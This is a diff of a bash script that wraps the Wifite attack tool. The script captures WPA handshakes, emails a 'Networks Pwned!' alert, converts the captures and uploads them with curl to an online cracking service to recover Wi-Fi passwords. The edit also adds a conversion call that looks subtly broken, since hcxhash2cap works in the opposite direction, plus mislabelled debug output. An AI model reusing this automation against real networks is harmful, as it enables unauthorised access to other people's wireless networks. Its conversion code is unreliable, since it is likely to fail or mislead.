@@ -350,17 +350,15 @@ sudo ./Wifite.py
 crack () {
 echo "Handshakes have been captured!" | mail -s "Networks Pwned!" $email > /dev/null 2>&1
 crack_hashes
-cleanup
+cleanup 
 }
 
-#!/bin/bash
 
-# Function to convert .cap file to .hccapx
 convert_cap_to_hccapx() {
-    # Check if hcxpcaptool is installed
-    if ! command -v hcxpcaptool &> /dev/null
+    # Check if hcxhash2cap is installed
+    if ! command -v hcxhash2cap &> /dev/null
     then
-        echo "hcxpcaptool could not be found. Please install it first."
+        echo "hcxhash2cap could not be found. Please install it first."
         exit 1
     fi
 
@@ -387,17 +385,22 @@ convert_cap_to_hccapx() {
     # Output file name (same as input file but with .hccapx extension)
     hccapx_file="${cap_file%.cap}.hccapx"
 
-    # Convert the .cap file to .hccapx using hcxpcaptool
+    # Convert the .cap file to .hccapx using hcxhash2cap
     echo "Converting $cap_file to $hccapx_file..."
-    hcxpcaptool -z "$hccapx_file" "$cap_file"
+    hcxhash2cap --hccapx "$hccapx_file" "$cap_file" || {
+        echo "Error: Conversion failed!"
+        exit 1
+    }
 
-    if [ $? -eq 0 ]; then
-        echo "Conversion successful: $hccapx_file"
-    else
-        echo "Conversion failed!"
+    # Check if the conversion file exists
+    if [ ! -f "$hccapx_file" ]; then
+        echo "Error: $hccapx_file does not exist. Please check the conversion process."
         exit 1
     fi
+
+    echo "Conversion successful: $hccapx_file"
 }
+
 
 # Function to crack hashes locally or via cloud
 crack_hashes() {
@@ -428,25 +431,36 @@ crack_hashes() {
 
                 # Convert the cap file to hccapx format
                 echo "Please provide the path to your .cap file:"
+                echo "Your current directory:"
+                pwd
+                ls *.cap  
                 read -p "Path to .cap file: " cap_file
 
                 # Call the conversion function
                 convert_cap_to_hccapx "$cap_file"
                 hccapx_file="${cap_file%.cap}.hccapx"
 
+                # Check if the .hccapx file exists before attempting upload
+                if [ ! -f "$hccapx_file" ]; then
+                    echo "Error: $hccapx_file does not exist. Please check the conversion process."
+                    exit 1
+                fi
+
                 # Upload to OnlineHashCrack
                 echo "Uploading $hccapx_file to OnlineHashCrack..."
-                response=$(curl -s -X POST https://www.onlinehashcrack.com/crack-wpa/ \
+                response=$(curl -s -w "%{http_code}" -X POST https://www.onlinehashcrack.com/crack-wpa/ \
                     -F "email=$user_email" \
                     -F "file=@$hccapx_file" \
                     -F "hash_type=wpa" \
                     -F "submit=Submit")
 
-                # Check the response for success or failure
+                # Output the response status code and body for debugging
+                echo "Response Code: $response"
+
                 if [[ "$response" == *"Cracking started"* ]]; then
                     echo "Cracking request submitted successfully."
                 else
-                    echo "Error submitting your request. Please try again."
+                    echo "Error submitting your request. Please try again. Response: $response"
                     exit 1
                 fi
                 break
@@ -456,52 +470,6 @@ crack_hashes() {
                 ;;
         esac
     done
-}
-
-
-
-# Function to convert .cap file to .hccapx
-convert_cap_to_hccapx() {
-    # Check if hcxpcaptool is installed
-    if ! command -v hcxpcaptool &> /dev/null
-    then
-        echo "hcxpcaptool could not be found. Please install it first."
-        exit 1
-    fi
-
-    # Ensure the correct number of arguments is provided
-    if [ $# -ne 1 ]; then
-        echo "Usage: $0 <path-to-cap-file>"
-        exit 1
-    fi
-
-    # Input file (.cap)
-    cap_file="$1"
-
-    # Check if the file exists and is a .cap file
-    if [ ! -f "$cap_file" ]; then
-        echo "File $cap_file not found!"
-        exit 1
-    fi
-
-    if [[ "$cap_file" != *.cap ]]; then
-        echo "Please provide a .cap file!"
-        exit 1
-    fi
-
-    # Output file name (same as input file but with .hccapx extension)
-    hccapx_file="${cap_file%.cap}.hccapx"
-
-    # Convert the .cap file to .hccapx using hcxpcaptool
-    echo "Converting $cap_file to $hccapx_file..."
-    hcxpcaptool -z "$hccapx_file" "$cap_file"
-
-    if [ $? -eq 0 ]; then
-        echo "Conversion successful: $hccapx_file"
-    else
-        echo "Conversion failed!"
-        exit 1
-    fi
 }
 
 
